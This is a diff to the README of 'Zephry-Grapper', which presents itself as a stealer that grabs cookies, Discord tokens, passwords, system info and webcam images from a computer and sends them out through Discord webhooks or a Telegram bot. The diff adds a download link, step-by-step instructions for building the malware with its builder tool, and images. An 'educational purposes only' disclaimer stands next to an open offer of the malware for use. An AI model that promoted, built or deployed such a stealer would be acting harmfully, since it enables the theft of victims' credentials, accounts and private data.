@@ -1,4 +1,6 @@
 # Zephry-Grapper
+<img src="https://cdn.discordapp.com/attachments/1164559111879393342/1170816488752545887/icon.jpg?ex=655a6ad3&is=6547f5d3&hm=7b0f8969f3590742aa3a87755b0fbfeb77693d0eacdd6e6b26a2b5c7c9ee67f9&">
+
 **Info:** Zephry Grapper is a OP grabber which grabs everything from a computer such as cookies, discord tokens, passwords, system info and stuff like that.
 
 **Disclaimer:** This program is provided for educational and research purposes only. The creator of this program does not condone or support any illegal or malicious activity, and will not be held responsible for any such actions taken by others who may use this program. By downloading or using this program, you acknowledge that you are solely responsible for any consequences that may result from the use of this program.
@@ -42,3 +44,15 @@
     • Captures Webcam Image.
     • Sends All Data Through Discord Webhooks/Telegram Bot.
     (...more)
+
+## How To Build
+
+    • 1) Download The Newest Release By Clicking Here [Download](https://github.com/Darkblade54/Zephry-Grapper/archive/refs/heads/main.zip)
+    • 2) Extract The Zip Into A Folder
+    • 3) Make Sure You Have Python Istalled If Not Run "install_python.bat"
+    • 4) Run "Start.bat"
+    • 5) Select Options In The Builder
+    • 6) Press "Build"
+    • 7) Wait Until Build Is Done
+### GUI:
+<img src="https://cdn.discordapp.com/attachments/1164559111879393342/1170826266820219010/image.png?ex=655a73ee&is=6547feee&hm=a42b5cc28052498ed4b50c4c3011c899949c59257827b74b629e848db9481828&">
